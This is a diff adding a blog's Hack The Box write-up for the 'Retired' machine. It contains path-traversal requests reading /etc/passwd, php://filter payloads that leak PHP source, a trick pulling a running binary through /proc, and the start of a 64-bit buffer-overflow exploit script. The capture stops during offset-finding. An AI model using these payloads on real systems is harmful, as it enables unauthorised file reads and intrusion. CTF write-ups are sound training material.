@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Retired :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Overview Enumeration NMAP ┌──(kali㉿kali)-[~/Documents/HackTheBox/retired] └─$ cat nmapAll.txt # Nmap 7.92 scan initiated Tue May 24 13:37:13 2022 as: nmap -Pn -p- -A -oN nmapAll.txt 10.10.11.154 Nmap scan report for 10.10.11.154 Host is up (0.029s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA) | 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA) |_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519) 80/tcp open http nginx | http-title: Agency - Start Bootstrap Theme |_Requested resource was /index." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/retired/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Retired :: Research blog">
+<meta property="og:description" content="A buffer overlfow for foothold ..." />
+<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/retired/" />
+<meta property="og:site_name" content="Retired" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/hackthebox/retired/">Retired</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-09 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Retired" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/HackTheBox/retired<span style="color:#f92672">]</span>
+└─$ cat nmapAll.txt                             
+<span style="color:#75715e"># Nmap 7.92 scan initiated Tue May 24 13:37:13 2022 as: nmap -Pn -p- -A -oN nmapAll.txt 10.10.11.154</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.154
+Host is up <span style="color:#f92672">(</span>0.029s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    nginx
+| http-title: Agency - Start Bootstrap Theme
+|_Requested resource was /index.php?page<span style="color:#f92672">=</span>default.html
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Enumerating the webserver i was able to get what i thought was <code>LFI</code>. However, further enumeration revealed this wasn&rsquo;t the case.</p>
+<h2 id="lfi"><code>LFI</code><a href="#lfi" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /index.php?page<span style="color:#f92672">=</span>../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: 10.10.11.154
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:91.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+Server: nginx
+Date: Tue, <span style="color:#ae81ff">24</span> May <span style="color:#ae81ff">2022</span> 17:41:40 GMT
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+Connection: close
+Location: /index.php?page<span style="color:#f92672">=</span>default.html
+Content-Length: <span style="color:#ae81ff">1488</span>
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+vagrant:x:1000:1000::/vagrant:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+dev:x:1001:1001::/home/dev:/bin/bash
+</code></pre></div><h3 id="indexphp">Index.php<a href="#indexphp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>After a bit of enumeration i couldn&rsquo;t understand why this <code>LFI</code> was acting so weird and i wasn&rsquo;t able to get code execution. Using this <code>LFI</code> i grabbed the source code of the index.php file to understand what the vulnerability actually was. It turns out this is just a local file read not a local file inclusion</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/HackTheBox/retired<span style="color:#f92672">]</span>
+└─$ echo <span style="color:#e6db74">&#34;PD9waHAKZnVuY3Rpb24gc2FuaXRpemVfaW5wdXQoJHBhcmFtKSB7CiAgICAkcGFyYW0xID0gc3RyX3JlcGxhY2UoIi4uLyIsIiIsJHBhcmFtKTsKICAgICRwYXJhbTIgPSBzdHJfcmVwbGFjZSgiLi8iLCIiLCRwYXJhbTEpOwogICAgcmV0dXJuICRwYXJhbTI7Cn0KCiRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsKaWYgKGlzc2V0KCRwYWdlKSAmJiBwcmVnX21hdGNoKCIvXlthLXpdLyIsICRwYWdlKSkgewogICAgJHBhZ2UgPSBzYW5pdGl6ZV9pbnB1dCgkcGFnZSk7Cn0gZWxzZSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaW5kZXgucGhwP3BhZ2U9ZGVmYXVsdC5odG1sJyk7Cn0KCnJlYWRmaWxlKCRwYWdlKTsKPz4K&#34;</span> | base64 -d 
+&lt;?php
+<span style="color:#66d9ef">function</span> sanitize_input<span style="color:#f92672">(</span>$param<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    $param1 <span style="color:#f92672">=</span> str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$param<span style="color:#f92672">)</span>;
+    $param2 <span style="color:#f92672">=</span> str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$param1<span style="color:#f92672">)</span>;
+    <span style="color:#66d9ef">return</span> $param2;
+<span style="color:#f92672">}</span>
+
+$page <span style="color:#f92672">=</span> $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;page&#39;</span><span style="color:#f92672">]</span>;
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>isset<span style="color:#f92672">(</span>$page<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> preg_match<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/^[a-z]/&#34;</span>, $page<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+    $page <span style="color:#f92672">=</span> sanitize_input<span style="color:#f92672">(</span>$page<span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+    header<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Location: /index.php?page=default.html&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+
+readfile<span style="color:#f92672">(</span>$page<span style="color:#f92672">)</span>;
+?&gt;
+
+</code></pre></div><h3 id="activate_licensephp">Activate_license.php<a href="#activate_licensephp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><img src="/images/uploadpage.png" alt="uploadpage"></p>
+<p>I wanted to take a look at the source code of this page to understand what was actually going on. Using the <code>LFI</code> from earlier I was able to base64 encode the file and decode it on my local machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /index.php?page<span style="color:#f92672">=</span>php://filter/convert.base64-encode/resource<span style="color:#f92672">=</span>activate_license.php HTTP/1.1
+Host: 10.10.11.154
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:91.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+
+
+
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Server: nginx
+Date: Tue, <span style="color:#ae81ff">24</span> May <span style="color:#ae81ff">2022</span> 19:31:31 GMT
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+Connection: close
+Content-Length: <span style="color:#ae81ff">780</span>
+
+PD9waHAKaWYoaXNzZXQoJF9GSUxFU1snbGljZW5zZWZpbGUnXSkpIHsKICAgICRsaWNlbnNlICAgICAgPSBmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydsaWNlbnNlZmlsZSddWyd0bXBfbmFtZSddKTsKICAgICRsaWNlbnNlX3NpemUgPSAkX0ZJTEVTWydsaWNlbnNlZmlsZSddWydzaXplJ107CgogICAgJHNvY2tldCA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwogICAgaWYgKCEkc29ja2V0KSB7IGVjaG8gImVycm9yIHNvY2tldF9jcmVhdGUoKVxuIjsgfQoKICAgIGlmICghc29ja2V0X2Nvbm5lY3QoJHNvY2tldCwgJzEyNy4wLjAuMScsIDEzMzcpKSB7CiAgICAgICAgZWNobyAiZXJyb3Igc29ja2V0X2Nvbm5lY3QoKSIgLiBzb2NrZXRfc3RyZXJyb3Ioc29ja2V0X2xhc3RfZXJyb3IoKSkgLiAiXG4iOwogICAgfQoKICAgIHNvY2tldF93cml0ZSgkc29ja2V0LCBwYWNrKCJOIiwgJGxpY2Vuc2Vfc2l6ZSkpOwogICAgc29ja2V0X3dyaXRlKCRzb2NrZXQsICRsaWNlbnNlKTsKCiAgICBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CiAgICBzb2NrZXRfY2xvc2UoJHNvY2tldCk7Cn0KPz4K
+
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/HackTheBox/retired<span style="color:#f92672">]</span>
+└─$ echo <span style="color:#e6db74">&#34;PD9waHAKaWYoaXNzZXQoJF9GSUxFU1snbGljZW5zZWZpbGUnXSkpIHsKICAgICRsaWNlbnNlICAgICAgPSBmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydsaWNlbnNlZmlsZSddWyd0bXBfbmFtZSddKTsKICAgICRsaWNlbnNlX3NpemUgPSAkX0ZJTEVTWydsaWNlbnNlZmlsZSddWydzaXplJ107CgogICAgJHNvY2tldCA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwogICAgaWYgKCEkc29ja2V0KSB7IGVjaG8gImVycm9yIHNvY2tldF9jcmVhdGUoKVxuIjsgfQoKICAgIGlmICghc29ja2V0X2Nvbm5lY3QoJHNvY2tldCwgJzEyNy4wLjAuMScsIDEzMzcpKSB7CiAgICAgICAgZWNobyAiZXJyb3Igc29ja2V0X2Nvbm5lY3QoKSIgLiBzb2NrZXRfc3RyZXJyb3Ioc29ja2V0X2xhc3RfZXJyb3IoKSkgLiAiXG4iOwogICAgfQoKICAgIHNvY2tldF93cml0ZSgkc29ja2V0LCBwYWNrKCJOIiwgJGxpY2Vuc2Vfc2l6ZSkpOwogICAgc29ja2V0X3dyaXRlKCRzb2NrZXQsICRsaWNlbnNlKTsKCiAgICBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CiAgICBzb2NrZXRfY2xvc2UoJHNvY2tldCk7Cn0KPz4K&#34;</span> | base64 -d
+
+&lt;?php
+<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>isset<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;licensefile&#39;</span><span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
+    $license      <span style="color:#f92672">=</span> file_get_contents<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;licensefile&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;tmp_name&#39;</span><span style="color:#f92672">])</span>;
+    $license_size <span style="color:#f92672">=</span> $_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;licensefile&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;size&#39;</span><span style="color:#f92672">]</span>;
+
+    $socket <span style="color:#f92672">=</span> socket_create<span style="color:#f92672">(</span>AF_INET, SOCK_STREAM, SOL_TCP<span style="color:#f92672">)</span>;
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!$socket<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> echo <span style="color:#e6db74">&#34;error socket_create()\n&#34;</span>; <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!socket_connect<span style="color:#f92672">(</span>$socket, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, 1337<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+        echo <span style="color:#e6db74">&#34;error socket_connect()&#34;</span> . socket_strerror<span style="color:#f92672">(</span>socket_last_error<span style="color:#f92672">())</span> . <span style="color:#e6db74">&#34;\n&#34;</span>;
+    <span style="color:#f92672">}</span>
+
+    socket_write<span style="color:#f92672">(</span>$socket, pack<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;N&#34;</span>, $license_size<span style="color:#f92672">))</span>;
+    socket_write<span style="color:#f92672">(</span>$socket, $license<span style="color:#f92672">)</span>;
+
+    socket_shutdown<span style="color:#f92672">(</span>$socket<span style="color:#f92672">)</span>;
+    socket_close<span style="color:#f92672">(</span>$socket<span style="color:#f92672">)</span>;
+<span style="color:#f92672">}</span>
+?&gt;
+
+</code></pre></div><p>This code establishes a connection with a port listening locally and sends it the contents of a file uploaded by the user. This seems like it could be an overflow. Since we have some sort of <code>LFI</code> we can enumerate <code>/proc</code> to understand what processes are running locally on the remote machine.</p>
+<p>Sending a request in burp such as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">GET /index.php?page=../../../../../../../../../../../proc/&lt;<span style="color:#f92672">procID</span>&gt;/cmdline
+</code></pre></div><p>Shows what processes are running.</p>
+<p>This gives us 3 processes back, 2 nginx worker processes and a binary called activate_license located at <code>/usr/bin/activate_license</code></p>
+<p>Through /proc it is possible to see the executable of the process that is running. This will allow us to download this binary for investigation on our local machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">GET /index.php?page=../../../../../../../../../../../proc/&lt;<span style="color:#f92672">procID</span>&gt;/exe 
+</code></pre></div><p>this reveals the junk you see when you view the contents of a binary, to make it more readable and less chance of copying bad bytes or losing some data we can base64 encode the binary with a php wrapper and then decode this on our local machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">GET /index.php?page=php://filter/convert.base64-encode/resource=/../../../../../../../../../../../../proc/403/exe HTTP/1.1
+
+Host: 10.10.11.154
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre></div><h2 id="investigating-file">Investigating file<a href="#investigating-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>After playing about with the binary locally, i have identified that it sets up a socket listener on a port specified when executing the file. This waits for data to be sent to it which it copies into a fixed length buffer of 512 bytes and prints out some output.</p>
+<p>No checks are done to prevent data greater than the size of the buffer being copied into it which means this binary is vulnerable to a buffer overflow.</p>
+<h3 id="gdb-forking-issue">GDB Forking issue<a href="#gdb-forking-issue" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>While investigating this file i found GDB broke when the program forked after receiving a connection. THis is because gdb does not follow forks by default. To fix this i used the following command.
+<code>gef➤  set follow-fork-mode child</code></p>
+<h2 id="64-bit-pre-requisites">64-bit pre-requisites<a href="#64-bit-pre-requisites" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Exploiting 64 bit architecture is slightly different in certain aspects to 32 bit architecture and we need to know these before continuing</p>
+<ul>
+<li>In 64 bit exploitation you never overwrite the <code>rip</code> register directly, you overwrite the <code>rsp</code> register and the <code>ret</code> loads this address into the instruction pointer later. But we will never see control directly over the <code>rip</code> directly from an overflow.</li>
+<li>In 32 bit systems, arguments and parameters are passed directly onto the stack. With 64 bit systems, parameters are passed onto the stack in registers such as <code>rdi</code>, <code>rsi</code>, <code>rdx</code> and <code>rcx</code>, in that order.</li>
+</ul>
+<p><strong>REWORD:
+The reason the RIP was not overflowed (technically it was, as we saw in the above screenshot, but there&rsquo;s more to it), is because the <code>AAAAAAAA</code> (<code>0x4141414141414141</code>) is considered a non-canonical memory address, or, in other words, <code>0x4141414141414141</code> is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses.
+Instead, the highest memory addresses programs can use are 48-bit wide addresses and they are capped to <code>0x00007FFFFFFFFFFF</code>. This is done to prevent the unnecessary complexity in memory address translations that would not provide much benefit to the OSes or applications as it&rsquo;s very unlikely they would ever need to use all of that 64-bit address space.</strong></p>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Find offset</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern create <span style="color:#ae81ff">550</span>                                                                               
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generating a pattern of <span style="color:#ae81ff">550</span> bytes <span style="color:#f92672">(</span>n<span style="color:#f92672">=</span>8<span style="color:#f92672">)</span>
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaa
+anaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaa
+abbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaa
+aaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaa
+aaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaa
+aaaacpaaaaaacqaaaaaacraaaaaacsaaaaa
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct
+<span style="color:#f92672">import</span> socket
+
+Host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+Port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9003</span>
+
+<span style="color:#75715e">#totalLen = 528</span>
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaa&#34;</span>
+retunAddr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BBBBBBBB&#34;</span>
+messageLen <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;!i&#39;</span>, len(buf) <span style="color:#f92672">+</span> len(retunAddr))
+
+<span style="color:#75715e">#buf+= b&#34;B&#34;*(totalLen - len(buf))</span>
+
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#75715e">#Creating socket</span>
+s<span style="color:#f92672">.</span>connect((Host, Port)) 
+s<span style="color:#f92672">.</span>send(messageLen <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> retunAddr)
+s<span style="color:#f92672">.</span>close()
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r <span style="color:#ae81ff">9003</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> starting server listening on port <span style="color:#ae81ff">9003</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> listening ...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> accepted client connection from 127.0.0.1:48333
+<span style="color:#f92672">[</span>Attaching after Thread 0x7ffff7b1e0c0 <span style="color:#f92672">(</span>LWP 19197<span style="color:#f92672">)</span> fork to child process 19199<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>New inferior <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>process 19199<span style="color:#f92672">)]</span>
+<span style="color:#f92672">[</span>Detaching after fork from parent process 19197<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>Inferior <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>process 19197<span style="color:#f92672">)</span> detached<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
+Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> reading <span style="color:#ae81ff">558</span> bytes
